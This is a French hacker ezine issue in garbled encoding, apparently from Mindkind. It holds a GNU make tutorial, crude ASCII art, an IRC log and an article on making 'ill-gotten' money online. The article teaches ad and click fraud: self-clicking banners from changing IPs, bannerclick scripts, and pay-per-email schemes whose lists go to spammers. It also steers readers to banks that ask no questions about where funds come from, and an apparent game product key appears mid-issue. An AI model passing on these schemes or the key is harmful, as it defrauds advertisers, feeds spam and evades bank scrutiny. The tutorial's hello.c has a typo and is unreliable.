certaine  valeur  dans  le  Makefile, tout  en  permettant  de  l'utiliser dans
plusieurs  endroits.  Lorsqu'une  modification  est  nΘcessaire,  il  suffit de
modifier l'affectation de la macro,  et elle apparaεt immΘdiatement partout  o∙
la macro est utilisΘe.

Le listing (3.0) prΘsente une nouvelle Θdition du Makefile de dΘmonstration. La
ligne 5 montre  comment dΘclarer une  macro OBJECT et  initialiser sa valeur  α
"Pear". Vous  supprimez Θgalement  les dΘpendances  prΘalablement utilisΘes  et
ajoutez un  nom de  cible par  dΘfaut plus  conventionnel, all,  α la  ligne 7.
Remarquez que cette  cible dΘpend de  trois cibles, on,  two, three. Un  projet
important est souvent structurΘ de cette faτon dans un fichier make.

	_= Listing (3.0) Makefile avec une dΘfinition de macro=_

|#| 1:   # Source: /home/acidmen/make/RCS/Makefile,v $
|#| 2:   # Revision: 1.3 $
|#| 3:
|#| 4:
|#| 5:   OBJECT= Pear
|#| 6:
|#| 7:   All: one two three
|#| 8:
|#| 9:   one:
|#| 10:     @echo one $(OBJECT)
|#| 11:
|#| 12:  two:
|#| 13:     @echo Two $(OBJECT)s
|#| 14:
|#| 15:  three:
|#| 16:     @echo Three $(OBJECT)s
|#| 17:
|#| 18:  # End Makefile

Les lignes 10, 13  et 16 montrent un  exemple d'utilisation de la  valeur de la
macro. Elle est  substituΘe au signe  $ et au  nom de la  macro qui suit  entre
parenthΦses. Les parenthΦses ne sont pas nΘcessaires lorsque le nom de la macro
ne  comporte  qu'une  lettre,  par  exemple  $x.  Il  est  cependant  conseillΘ
d'utiliser des noms de macro significatifs. A prΘsent, invoquez ce fichier make
et observez son rΘsultat.

|#| bash$ make
|#| One Pear
|#| Two Pears
|#| Three Pears
|#| bash$

Remarquez la substitution par la valeur. Notez aussi que la cible de la ligne 7
ne comporte aucune instruction. Cette ligne  ne sert qu'α relier une cible  aux
autres dΘpendances.

  >> Supplanter les valeurs d'une macro
La commande make permet Θgalement de passer outre la valeur d'une macro.
Avec le fichier make du listing (2.0), vous exΘcuter :

|#| bash$ make OBJECT=apple
|#| One apple
|#| Two apples
|#| Three apples
|#| bash$

La ligne 5 affecte la valeur "Pear" α la macro OBJECT, mais l'affectation de la
ligne de  commande "OBJECT=apple"  est prioritaire.  On peut  donc dire  que la
commande make effectue d'abord toute les affectations de macros dans le fichier
make, puis celles Θventuellement rencontrΘes sur la ligne de commande.

  >> Utiliser les variables d'environnement
La commande  make peut  Θgalement prendre  des valeurs  de l'environnement.  En
utilisant une nouvelle  fois le fichier  make du listing  (3.0), voyez si  vous
pouvez Θcraser une macro avec une variable d'environnement exportΘe :

|#| bash$ OBJECT=walnut make
|#| One Pear
|#| Two Pears
|#| Three Pears
|#| bash$

C'est Θtonnant, ce  test semble ne  pas fonctionner, En  rΘalitΘ, les variables
d'environnement n'Θcrasent pas les affectations de macros d'un fichier make. Si
la  macro  OBJECT  n'avait  pas  ΘtΘ  dΘfinie  dans  notre  fichier  make,   la
substitution aurais ΘtΘ  effectuΘe. Pour preuve,  mettez la ligne  5 du listing
(3.0) en commentaire et essayez de nouveau.

|#| bash$ OBJECT=walnut make
|#| One walnut
|#| Two walnuts
|#| Three walnuts
|#| bash$
`
Cette fois, aucune affectation de macro ne figurant dans le Makefile, la valeur
de la variable d'environnement OBJECT demeure et est utilisΘe comme attendu.

 _= Listing (4.0) Makefile avec l'affectation de la macro mise en commentaire=_


|#| 1:   # Source: /home/acidmen/make/RCS/Makefile,v $
|#| 2:   # Revision: 1.3 $
|#| 3:
|#| 4:
|#| 5:   #OBJECT= Pear
|#| 6:
|#| 7:   All: one two three
|#| 8:
|#| 9:   one:
|#| 10:     @echo one $(OBJECT)
|#| 11:
|#| 12:  two:
|#| 13:     @echo Two $(OBJECT)s
|#| 14:
|#| 15:  three:
|#| 16:     @echo Three $(OBJECT)s
|#| 17:
|#| 18:  # End Makefile

 
 >> Utiliser le paramΦtre -e
Un paramΦtre  de make,  -e, permet  α l'environnement  d'Θcraser les  macros du
fichier make. Toutefois, utilisez-le prudemment, car l'environnement peut  Ωtre
modifiΘ bien plus que vous ne le pensez. En reprenant le fichier make d'origine
du listing vous pouvez tester cette rΦgle :

|#| bash$ OBJECT=walnut make
|#| One Pear
|#| Two Pears
|#| Three Pears
|#| bash$ OBJECT=walnut make -e
|#| One walnut
|#| Two walnuts
|#| Three walnuts
|#| bash$

       - Vous avez exportΘ la variable d'environnement OBJECT et exΘcutΘ la
         commande make, mais la variable OBJECT n'a aucun effet

       - Vous avez exportez la variable d'environnement OBJECT une nouvelle
         fois, mais exΘcutez ici make avec le paramΦtre -e. Cette fois, la
         variable d'environnement OBJECT influence le rΘsultat.

            ++ Lorsque vous comptez sur des variables d'environnement dans un
               fichier make, assurez-vous qu'elles sont bien exportΘes de votre
               shell. Assurez-vous Θgalement de bien comprendre ce que la
               commande d'exportation intΘgrΘe effectue dans le shell bash.


 >> Les suffixe de fichiers
La  commande  make est  trΦs  largement dΘpendante  des  suffixes de  fichiers,
desquels elle dΘduit  le type du  fichier. GrΓce α  des conventions, elle  peut
appliquer  des rΦgles  de dΘduction  par dΘfaut.  Avant d'Θtudier  ces  rΦgles,
regardons quelques suffixes connus de make, dans le tableau (1.0)

Tableau (1.0)

   - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
   > Suffixe de fichier < | > Description                  <
   - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
   ] .c                   | Module source en langage C     [
   ] .h                   | Fichier d'en-tΩte en lengage C [
   ] .cc                  | Module source en langage C++   [
   ] .o                   | Fichier objet compilΘ          [
   - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


 >> Comprendre les rΦgles de dΘduction
La puissance de la commande make propose en partie sur ces rΦges de dΘductions.
Mais ceux-ci peuvent  Ωtre une source  de frustration lorsqu'elles  ne sont pas
bien comprises.( exemple tirΘ d'un fait vΘcue : essayer de sodomiser sa boite α
malle )
                =|
             /---|---
      8=====D|______|
                  ||
                  ||
                  || (c) Walt Disney
 
 > Tester les rΦgles de dΘduction par dΘfault
Ecrivez ce ptit programme - hello.c -

|#| 1:   #include &lt;stdio.h>
|#| 2:   int main(int argc, char **argv) {
|#| 3:   
|#| 4:   	(void) argc;
|#| 5:   	(void) argv;
|#| 6:
|#| 7:  	PUTS("Hello World!");
|#| 8:		return 0;
|#| 9:   }


        /\   Pause publicitaire payΘe en nature par JoJo savard
       /  \     Qui vous dit :
     <      >                     1-800-Dit-moi-pas?
       \  /    "salut mes chouuuxx mieux ruiner c'est mieux que vaut l'astre
        \/     est dans la lune, la lune est dans le ciel suivez votre bonne
               Θtoile."

                 hooo, un beau message d'espoir pour le temps des fΩtes ;)
                           mon coeur se contient plus.
                   ...
                   qqn est partant pour coder a ze power di-kRypt3rz 3000 for
                   j0j0 s4vardz?



Bon, une fois votre programme Θcrit, testez ensuite les rΦgles de dΘductions
par dΘfault de make, comment indiquΘ dans le listing (4.5).

    _= Listing (4.5) Tester les rΦgles de dΘduction de hello.o de GNU make=_

|#| 1:   bash$ mkdir experiment
|#| 2:   bash$ cd experiment
|#| 3:   bash$ cp ../hello.c .
|#| 4:   bash$ >Makefile
|#| 5:   bash$ make hello.o
|#| 6:   cc -c hello.c -o hello.o
|#| 7:   bash$ type cc
|#| 8:   cc is /usr/bin/cc
|#| 9:   bash$ls -dl /usr/bin/cc
|#| 10:  lrwxrwxrwx  1  root   root  3 Dec 15 2002 /usr/bin/cc -> gcc
|#| 11:  bash$

Voici les Θtapes de ce test :

1. Vous crΘez un rΘpertoire dans lequel travailler ( ligne 1 )

2. Vous passez dans ce rΘpertoire ( ligne 2 )

3. Vous recopiez votre programme hello.c dans le rΘpertoire en cours (ligne 3).
   Remarquez que le rΘpertoire source de hello.c peut Ωtre diffΘrent dans votre
   cas.

4. Vous crΘez un Makefile vide dans lequel make pourrat travailler ( ligne 4 ).

5. Vous invoquez make avec le Makefile vide dans le rΘpertoire en cours (ligne 5)
   Indiquez explicitement le nom de cible hello.o α make, car le Makefile ne
   contient aucune cible dΘfinie.

6. La commande make s'exΘcute, montrant que sa rΦgle interne dΘduit que hello.c
   doit Ωtre compilΘ par un compilateur C pour produire hello.o ( ligne 6 ).

7. Vous demandez au shell d'o∙ provient cc ( ligne 7 ). Le shell indique le nom
   du chemin α la ligne 8.

8. Vous invoquez la commande ls avec le paramΦtre -dl ( ligne 9 ) et dΘcouvrez
   que la commande cc est un lien symbolique vers la commande gcc ( ligne 10 ).

IndΘpendamment du fait que la rΦgle ne fournit pas les paramΦtres -D_GNU_SOURCE
et -Wall, tout se passe trΦs bien sans aucune aide de votre part. Ces rΘsultats
pouvant  Ωtre  lΘgΦrement  diffΘrents  de  ceux  attendus,  vous  devez dΘfinir
explicitement une rΦgle correspondant α vos besoins.


 >> DΘfinir une rΦgle de dΘduction
Le listing (5.0) prΘsente un fichier make de dΘmonstration contenant une rΦgle
de dΘduction.

      _= Listing (5.0) Une rΦgle de dΘduction de make =_

|#| 1:   CC = gcc
|#| 2:   STD = _GNU_SOURCE
|#| 3:   
|#| 4:   .c.o:
|#| 5:      $(CC) -c -Wall $(CFLAGS) -D$(STD) $< -o $@

La ligne 1 montre la faτon conventionnelle de choisir votre compilateur dans un
fichier  make,  avec la  macro  CC. Ici,  la  macro pointe  directement  sur le
compilateur gcc. La ligne 2 dΘfinit la macro STD permettant de sΘlectionner  le
standard sous lequel le compiler. La cible de la ligne 4 est d'un type spΘcial:
elle est composΘe du suffixe du fichier d'origine et de celui du fichier cible.
En dΘfinissant une cible sous cette forme, vous dΘfinissez en rΘalitΘ une rΦgle
de dΘduction destinΘe α make.
    

     ^
    / \
   /   \
  /  A  \ ttention ------------------------------------------------------------
 /_ _ _ _\
          
    /     Ne dΘfinissez jamais de dΘpendance pour une rΦgle de dΘduction. La
   /      commande make ignore les dΘpendances des rΦgles de dΘduction.  Sur 
  /__ _   certaines plates-formes UNIX, la rΦgle n'est pas interprΘtΘe comme
          une rΦgle de dΘduction lorsque des dΘpendances sont indiquΘes
          ---------------------------------------------------------------------


La ligne 4 dΘfinit une rΦgle  de dΘduction indiquant que si vous  dispoez d'une
cible constituΘe  d'un fichier  objet (*.o)  et constatez  que vous disposez du
fichier  d'entrΘe  correspondant  avec   le  suffixe  .c,  vous   exΘcutez  les
instructions qui suivent.

 >> Instruction α exΘcuter
La ligne 5  du listing (5.0)  reprΘsente la seule  instruction α exΘcuter.  Une
instruction doit commencer par un caractΦre de tabulation. Les espaces ici sont
interdites. Il peut y avoir plusieurs  actions, mais une  seule est nΘcessaire.
Notez Θgalement que si la commande  de l'action commence par un caractΦre  "@",
make supprime l'affichage  de la commande  sur la sortie  standard. Vous l'avez
peut-Ωtre remarquΘ aux lignes 5, 8 et 11 du listing (2.0)


                ____
|| |\ || ||=== | _  |
|| | \|| ||=   ||_| |
|| | \ | ||    |____|_ _ _ _ _ _ _ _ _ _ _ _ _ _ __ _ _ ______ _ _ _ _ _ _ _ __

Les lignes  d'action d'un  fichier make  doivent commencer  par une tabulation.
Certains Θditeurs insistent sur  l'utilisation des blancs lorsque  vous appuyez
sur la touche Tab. VΘrifiez que le premier caratΦre est bien le caractΦre ASCII
de tabulation, sinon make ne l'accepte pas comme instruction α exΘcuter.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - --- --  - -  -- -- 



La ligne 5 du listing (5.0) dΘcrit une instruction de compilation faisant grand
usage des macros. La plupart sont aisΘment comprΘhensibles.
Cela nous laisse deux macros d'aspect bizzare : "$<" et "$@".

  
 >>Les macros intΘgrΘes
La commande make gΦre au moins six macros intΘgrΘes. Celles-ci sont diffΘrentes
des macros  dΘfinies par  l'utilisateur, car  elles n'ont  jamais besoin d'Ωtre
dΘfinies. Elles  sont gΘrΘes  en interne  par la commande make  et leur  valeur
change en fonction des rΦgles de dΘduction.

Les plus importantes de ces macros sont prΘsentΘes au Tableau (2.0)

Tableau (2.0)

 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 > Nom de macro       < | > Description                                      <
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 ] $*                   | Cette macro fournit l'ΘlΘment nom de fichier du    [
 ]                      | dΘpendant actuel ( le suffixe Θtant supprimer      [
 ]                      |                                                    [
 ] $@                   | Cette macro fournit le nom complet, avec le        [
 ]                      | suffixe de la cible actuelle.                      [
 ]                      |                                                    [
 ] $<                   | Cette macro fournit le nom de fichier dΘpendant    [
 ]                      | complet, avec le suffixe.                          [
 ]                      |                                                    [
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dans la session  ΘtudiΘe au listning  (4.5), la ligne  5 dΘsigne hello.o  comme
cible, Dans  la rΦgle  de dΘduction  des lignes  5 et  6 du  listing (5.0), les
valeurs du Tableau (3.0) ci-dessous devraient Ωtre indiquΘes.

Tableau (3.0)

   - - - - - - - - - - - - - - - - - - - - - - - - 
   > Nom de macro       < | > valeur de la macro <
   - - - - - - - - - - - - - - - - - - - - - - - - 
   ] $*                   | "hello"              [
   ] $@                   | "hello.o"            [
   ] $<                   | "hello.c"            [
   - - - - - - - - - - - - - - - - - - - - - - - -


Souvez-vous que ces  macros intΘgrΘes ne  possΦdent de valeur  qu'α l'intΘrieur
d'une rΦgle  de dΘduction.  La macro  $< comporte  une petite  exception, et au
moins deux autre macros intΘgrΘes ont d'autres usages.


 >> La macro CFLAGS
La macro CFLAGS est utilisΘe  pour contenir d'autres paramΦtres du  compilateur
C.  Si elle   n'est  pas   dΘfinie  dans   le  fichier   make,  vous   avez  la
possibilitΘ d'initialiser  une variable  d'environnement  pour  la session  dec
compilation en cours.

  > Utiliser CFLAGS α partir du shell
Une habitude courante consiste α utiliser  la macro CFLAGS pour effectuer (  ou
non ) une compilation en mode dΘbogage. Notez le dΘroulement de cette procΘdure
dans cette exemple :

|#|   bash$ rm hello.o
|#|   export CFLAGS=-g
|#|   bash$ make hello.o
|#|   gcc -c -Wall -g -D_GNU_SOURCE hello.c -o hello.o
|#|   bash$

Voici la procΘdure utilisΘe ici :

1. Vous prenez soin de vous dΘbarrasser du dernier hello.o crΘΘ ( sinon, make ne
   se sentira pas obligΘ de le recrΘer )

2. Vous dΘfinissez et exportez la variable d'environnement CFLAGS avec le 
   paramΦtre de mise au point de gcc -g.

3. A partir de maintenant, lorsque vous compilez, la commande make prend
   automatiquement la valeur exportΘe de CFLAGS et l'applique α la ligne de
   commande ( Remarquez que le paramΦtre -g apparaεt dans la commande gcc ).

On peut utiliser la mΩme technique pour recompiler afin d'optimiser au lieu  de
dΘboguer. Ce petit truc s'avΦre  particuliΦrement utile lorsque le Makefile  se
trouve contr⌠lΘ par un RCS ; il n'est pas nΘcessaire de le modifier.

Joyeux noδl : ut2k3 : lyr22-rz743-a9d7t-cnnen :



            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                acidmen@mindkind.org                     /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'




  < Mindkind tales from IRC >

  [16:55] &lt;Wyzeman> jpeu tu hypotequer mes futur par de mindkind ?
  [16:55] &lt;LastCall_> hahaha
  [16:56] &lt;LastCall_> le gars fini par Θcrire un livre
  [16:56] &lt;LastCall_> "J'ai basΘ ma vie sur un ezine et un channel IRC"
  [16:56] &lt;LastCall_> par Wyzeman de Mindkind
  [16:56] &lt;LastCall_> pendant ce temps ya
  [16:56] &lt;Wyzeman> LastCall_ __2 a bien reussi sa vie a cause de iga
  [16:56] &lt;Wyzeman> sa job qui a la, il la eu a cause de iga
  [16:56] &lt;LastCall_> "Comment je suis devenu millionaire en patentant le code open source et/ou GPL"
  [16:56] &lt;Wyzeman> moi jai eu un hub 3com
  [16:56] &lt;LastCall_> par LastCall_
  [16:56] &lt;LastCall_> et
  [16:56] &lt;Wyzeman> hahaha
  [16:57] &lt;LastCall_> "Comment je suis devenu milionaire en crossant LastCall_ "
  [16:57] &lt;LastCall_> par MindFlayR
  [16:57] &lt;LastCall_> haha
  [16:57] &lt;Wyzeman> hahaha
  [16:57] &lt;LastCall_> hahaha

  < ----------------------- >



                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.03 L'extrΘmitΘ de l'Arc-en-ciel.com                 \        \     !
     .             aka                                         \        \    .
     ;       40 PKP en show dans un trou de terre               \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

Pour plusieurs  raisons j'aimerais  faire une  petite intro  α cet article tout
d'abord parce que  j'ai moi mΩme  hΘsitΘ 2 ans  pour l'Θcrire car  on parle ici
d'un secret bien gardΘ et aussi parce  que ceux qui le connaisse ne seront  pas
forcΘment trΦs heureux que je dΘvoile  tout les petits dΘtails du mΘtier.  Bien
sur je ne divulguerai  pas ma/mes techniques parce  que se serait α  la fois me
priver d'un  revenu potentiel  mais aussi  une porte  d'entrΘe aux abuseurs qui
pourrait ruiner cet art.


Table des matiΦres :
--------------------

1: VΘritable intro
2: ThΘorique (philosophie/buts/espΘrances)
3: La banque (Choisir/expΘriences/retour)
4: Les commanditaires (WTF?/?/!/Retour)
5: StratΘgies (Actif-Passif/pi0n/emprunt) 
6: Optimisation (Linux)
7: Les dΘceptions du mΘtier
8: Liens utiles (Commanditaire/TGP)
9: Conclusion.

---------------------------------------------------------------------

1- VΘritable introduction

Je voulais Θcrire un article sur un truc technique de la mort du genre  comment
overclocker un VAX avec du vieux cheeze-weeze mais j'ai du me rΘsigner α Θcrire
premiΦrement  sur quelque  chose que  je connais  plus que  tout,  c'est-α-dire
comment escroquer les autres.

Ont peut dire que j'ai une grande expΘrience de l'enrichissement personnel  sur
Internet, jai dΘbutΘ avec xpics, premier sponsor vraiment payant ou on  pouvait
faire le motton en cliquant sur nos banniΦres nous mΩme et en dΘconnectant pour
avoir  un  nouveau IP.  Ensuite  il y  a  eu les  "Pay  to surf"  gotoworld  et
alladvantage  qui nous  promettaient fortune  et gloire  si l'ont  parvenait  α
ramasser  un  max de  "referals"  comme dans  une  grosse pyramide  pyramidale!
(hehe). Ensuite il y eu les  script de bannerclick sur eFnet avec  lesquels ont
arrivait a se gΘnΘrer  un beau butin en  peu de temps. Cette  Θpoque f√t suivie
d'une lΘgΦre aventure du cotΘ de la P0rn buisness que jai finalement  abandonnΘ
par manque de temps.  

Mais maintenant, qu'est-ce qui me reste ? .. c'est un secret :)). Cet article a
pour but de vous enseigner l'art de concevoir vos propres magouilles et de  les
optimiser lΘgalement et  efficacement de faτons  α pouvoir vous  aussi profiter
rapidement de plein d'argent mal acquit.

Secret?.. oui! Malheureusement je ne suis pas sur le point de mettre fin α  mes
activitΘs dans  ce domaine  et comme  vous donner  mes trucs  conduirait α  une
rΘduction potentielle de mon revenu je rΘpΦte encore que vous ne trouverez  ici
que la mΘthode permettant de dΘvelopper soi-mΩme sa stratΘgie. 

Si par erreur vous tentez de me  poser des questions sur ce sujet, je rΘpondrai
par un silence. Soyez content de cet  article et n'en demandez pas plus car  on
parle ici de vrai argent et de connaissances qui sont trΦs utiles monΘtairement
parlant.  


2- ThΘorique

- Un peu de philosophie

Se lancer  dans le  monde de  l'enrichissement personnel  sur Internet  est une
longue  et  fastidieuse aventure  qui  vous amΦnera  α  faire plusieurs  choix,
premiΦrement sur votre Θthique personnelle car quelqu'un qui s'y met vraiment a
fond peut rΘcolter de faramineuses sommes  et se payer une ferrari mais  a quel
prix ?  Vous avez  s√rement dΘjα  Θmis quelques  plaintes α  la rΘception  d'un
courriel non sollicitΘ. Si vous voyez ce que je veux dire...  (j'y reviendrai) 

Vous aurez aussi plusieurs compromis α effectuer, utiliserez vous une technique
totalement  lΘgale?,  semi-lΘgale?,  lΘgale  α  l'Θtranger  (hide  and   pray),
complΦtement illΘgale? ($$$), Vous aurez  aussi des compromis α faire  du genre
le profit vis α vis  vos ressources. Plusieurs techniques nΘcessitent  beaucoup
de bande passante et d'argent. Ce qui peut s'avΘrer rentable ne le demeure  pas
toujours. 

- Quoi viser?

PremiΦrement vous devez  Θtablir votre stratΘgie,  trouver l'idΘe premiΦre,  LA
stratΘgie qui vous rapportera de l'argent, il vous faudra ensuite vous  trouver
quelqu'un qui vous payera, vous devrez  aussi faire affaire avec une banque  et
tenter  d'optimiser  au maximum  votre  mΘthode de  faτon  α atteindre  le  but
ultime... l'effort 0. 

- $$$$?

Je  me rend  compte que  si vous  Ωtes rendu  α lire  ici c'est  que vous  Ωtes
particuliΦrement  intΘressΘ,  mais  au  point de  finir  la  lecture?  Le cyber
-entrepreneur moyen,  qui fait  sa business  sur Internet  dans, par exemple le
monde de la  pornographie reτoit un  salaire annuel d'environ  160K USD/ans. On
parle ici d'une business α temps plein.  Le petit escroc que je suis, avec  une
stratΘgie  d'effort  0 peaufinΘe  peut  facilement rΘcolter  ~700$USD  par mois
(1292.72$CAD). Et ce je vous rappelle en ne faisant aucun effort.  


3- Passez GO et recevez l'argent de la banque.

- L'importance de choisir
      
Comme  vous vous  en doutez  s√rement la  majoritΘ des  fonds que  vous  pouvez
espΘrer rΘcolter est  en devises ΘtrangΦres  donc il vous  faudra faire affaire
avec une banque. Mais laquelle choisir  ? celle avec un service rapide  ? celle
avec un gros transit ? celle qui posera le moins de questions?

Parmi les banques du  QuΘbec, j'ai fait affaire  avec deux des principales,  La
banque royale et Desjardins. Oui oui je sais que Desjardins est une caisse mais
pour la cause nous l'insΦreront dans la classe des banques aussi car croyez moi
elle a  beaucoup plus  de points  communs que  de diffΘrences  avec les  autres
banques. 

      - La banque royale
            - Transit de base      : 100$
            - Frais aux transactions: 0.25$ (ou illimitΘ 4$/mois)
            - Gel de fonds            : 5 jours ouvrables
            - Autre             :
                  La banque royale dispose de plus de budget que
                  Desjardins et pour cette raison il y a plus 
                  d'heures d'ouvertures et moins d'attente.
                  └ noter que leurs employΘs ne posent jamais de
                  questions indiscrΦtes.

      - Desjardins
            - Transit de base      : 500$
            - Frais aux transactions: 0.25$ (ou forfaitaire)
            - Gel de fond !!      : 20 jours ouvrables
            - Autre                  :
                  Desjardins possΦde le pire service qu'un client
                  peut espΘrer, de longues filles d'attente, une
                  durΘe de gel de fond sur les capitaux Θtrangers
                  trop longues et en plus des employΘs qui posent
                  des questions indiscrΦtes sur la provenance de
                  vos fonds. 

Pour Θchanger  de la  monnaie ΘtrangΦre  je vous  suggΦre d'aller  α la  banque
royale, bien que le  transit ne soit que  de 100$ vous n'aurez  qu'a attendre 5
jours ouvrables  (soit une  semaine) pour  encaisser le  tout. Petite  note sur
Desjardins : si vous voulez effectuer un prΩt personnel je vous suggΦre d'aller
les voir car ils ont  de trΦs bon plans pour  les Θtudiants α comparΘ α  Royale
qui voudrons vous vendre une visa. 

- Return(0);

Il existe plusieurs autres banques mais je ne les ai pas toutes  expΘrimentΘes.
De toutes  faτon ce  qu'il est  important de  se rappeler  c'est de ce que vous
aurez  vraiment  besoin,  en  l'occurrence  des  services  privΘs  rapides   et
avantageux sur les conditions de rΘception  de l'argent, car vous ne devez  pas
oublier ceci : contrairement aux chΦques habituels si vous dΘposez un chΦque de
devise ΘtrangΦre  dans un  guichet automatique,  vous seriez  mieux d'avoir  le
temps parce que le temps de traitement est presque triplΘ. 


4- Les commanditaires

- WTF?

Vous voici rendu α l'Θtape o∙  vous choisissez votre machine α sous.  Quelqu'un
devra vous  payer, mais  qui?. Il  existe des  centaines de  commanditaires sur
Internet et une trΦs grande majoritΘs feront faillite demain matin pour laisser
leur place α d'autres. Il ne faut surtout pas oublier que dans ce mΘtier si  le
"patron" ne vous paye pas vous ne pouvez pratiquement RIEN CONTRE LUI. Si  vous
ne choisissez pas un bon commanditaire vous avez toutes les chances du monde de
pleurer dans 3 mois quand vous ne recevrez pas votre chΦque. 

-!
      Mais quoi Θvaluer pendant son choix ?

PremiΦrement les programmes, la plupart des commanditaires offrent une gamme de
programmes du  genre Pay-per-click,  pay-per-impression pay-per-email,  pay-per
-signup,  pay-per-(ETC...).  Presque   tout  ces  programmes   contiennent  une
"attrape". Par exemple un commanditaire peut vous donner 0.25$ du click sur une
banniΦre mais avoir un ratio de conversion. Ce ratio c'est ce qui calcule votre
nombre de  click versus  les inscriptions  au site  gΘnΘrΘ par  votre lien. Par
exemple  si  vous  avez 50$  en  click  et 2  inscriptions  lΘgales  vous aurez
probablement un ratio de 1:1 ce qui maintiendra votre pay-rate α 0.25$. Mais si
vous avez  50$ et  0 inscription  votre ratio  sera tellement  bas que  vous ne
gagnerez  probablement plus  que 0.003$  par click  voir mΩme  vous vous  ferez
mettre α la cyber-porte.  

Pay per signup est gΘnΘralement trΦs  payant ~50$ de l'abonnement mais un  site
qui fonctionne au "signups" est gΘnΘralement beaucoup trop dur α maintenir pour
un Θtudiant. En effet,  un site qui fait  son argent avec de  vrais abonnements
devra avoir du  bon matΘriel toujours  renouvelΘ pour que  les clients affluent
car ils doivent payer si vous voulez vous enrichir. 

Le gros  programme facile  de nos  jours (et  je vous  ment pas)  c'est pay per
email. Le  "client" entre  son email  pour recevoir  des "free  pictures" et se
ramasse avec 25mo de e-mail de  junk a chaque jour. Les compagnies  qui offrent
ce genre de programme  peuvent payer jusqu'a 1$USD  par e-mail validΘ que  vous
leur donnez. Mais comment font-il pour  payer ? PremiΦrement ils sont payΘ  par
les contenu des e-mail de  junk qu'ils envoient. Certains "promoteur"  achΦtent
des espaces d'affichage dans les e-mail de "free pics". Mais ce n'est pas tout,
les compagnies revendent aussi leur  listes aux spammers ce qui  leur procurent
un bon  second revenu.  De toute  faτon, cela  ne nous  intΘresse pas vraiment,
retenez  seulement  que  c'est  le  meilleur  programme  disponible,  payant et
versatile. 

- Return(0);

Retenez  aussi  que  peu  importe  le  nouveau  programme  disponible  ont peut
facilement trouver sa valeur de  rentabilitΘ avec une semaine d'essaie.  Prenez
votre technique ΘprouvΘe favorite et soumettez la α votre commanditaire si  vos
profits baissent  trop ou  que votre  effort α  fournir devient trop important,
foutez  le programme  α la  poubelle ou  optimiser le  tout pour  que  l'effort
retourne α 0 (voir optimisation). 


5- Axis And Allies (AAA)
      
Alors l'ado, tu es en recherche de 'LA' faτon de t'enrichir !? Heh bien j'ai la
solution α  tes problΦmes  !!! Ou  plut⌠t, l'explication  de la  solution a tes
problΦmes. 


- StratΘgie Active ou StratΘgie Passive

Bien que vous soyez encore trΦs peu renseignΘ sur les dΘfΘrentes stratΘgies que
tout le monde utilise et qui donne un revenu assez moyen, j'aimerais, avant  de
vous  introduire α  ces stratΘgies  de base,  porter un  peu le  focus  sur  la
signification de stratΘgie active et celle de stratΘgie passive. 
      
      -Active:
            DΘsigne une stratΘgie o∙ l'entrepreneur doit constamment
            fournir un effort pour maintenir et garder en vie
            sa petite entreprise. Cette stratΘgie donne gΘnΘralement
            un plus gros revenu mais demande trop de temps. Je
            vous conseille fortement de ne jamais vous diriger
            vers un tel model.

      -Passive:
            C'est ce que vous recherchez, le moins d'effort possible
            pour un revenu optimal. (Voir optimisation) 


- Le pion ?

Maintenant que vous en  savez plus sur les  commanditaires, vous vous devez  de
les  fournir  de "pions"  pour  qu'α leur  tour  il vous  fournissent  de beaux
dollars. En fait, c'est ce qu'il y a de plus dur α faire dans ce mΘtier, amener
des foules de personnes ~40k  (toujours dans l'optique d'une stratΘgie  lΘgale)
sur vos sites pour agir de machine α sous. 

Admettons que vous possΘdez un site  web et que vous voulez y  ramener, disons,
30 000 personnes demain  matin. Est-ce possible ?..  .. oui! il faut  seulement
savoir comment s'y prendre. Il est Θvident que le type de site influe  beaucoup
:0}. 

Pour  cet  exemple nous  allons  prendre un  site  web standard  contenant  une
commandite par email  et 10 photos  d'une 'strip /dev/girl'.  Ce genre de  site
s'appelle  un  site  de  "thumbnails"  il  est  gΘnΘralement  utilisΘ  par  les
propriΘtaires de  site webs  pour promouvoir  leur propre  site. Par exemple le
site A  produit 40  mini pages  de thumbnails  et place  sur chacune  d'eux une
banniΦre qui est directement liΘ α son propre site. Ce qui redirige a coup  s√r
les pions sur le site principal. 

Ces "thumbnails" site sont souvent postΘs dans des rΘpertoires gratuits o∙ tout
les  pions  peuvent   consulter  α  chaque   jour  plusieurs  sites   du  genre
gratuitement.  (voir  rΘfΘrences α  la  fin). La  question  α se  poser  est la
suivante :"Si je ne  suis pas un gros  site budget, puis-je moi  aussi poster?"
Oui ! et croyez moi, sa rapport beaucoup de visites. 

L'idΘe est simple, vous  crΘer 30 pages diffΘrentes  et vous en postez  une par
jour. Les revenus viendront rapidement.  C'est d'ailleurs la stratΘgie la  plus
simple et  elle est  trΦs bien  connue de  tout le  monde. Elle α l'avantage de
ramener lΘgalement  les pions  α votre  site mais  le dΘsavantage  de consommer
beaucoup de bande passante. 

Une autre stratΘgie qui se lie bien avec celle des TGP consiste α Θchanger  des
liens  "linkexchange"  c'est-α-dire  que vous  allez  placer  une banniΦre  par
exemple sur un site  et cette banniΦre sera  liΘe a un autre  site de quelqu'un
comme  vous.  Plus votre  site  gΘnΦre de  click  plus votre  site  est affichΘ
ailleurs donc vous Ωtes plus visitΘ et tout le monde est content. 

Bien sur ces  stratΘgies ne sont  pas trΦs optimales  et demande trop  de temps
pour atteindre l'objectif  effort 0 sans  pour autan empΩcher  une optimisation
adΘquate qui  vous permettra  peut-Ωtre, si  vous Ωtes  intelligent, un gros 10
minutes de maintenance par jour. 

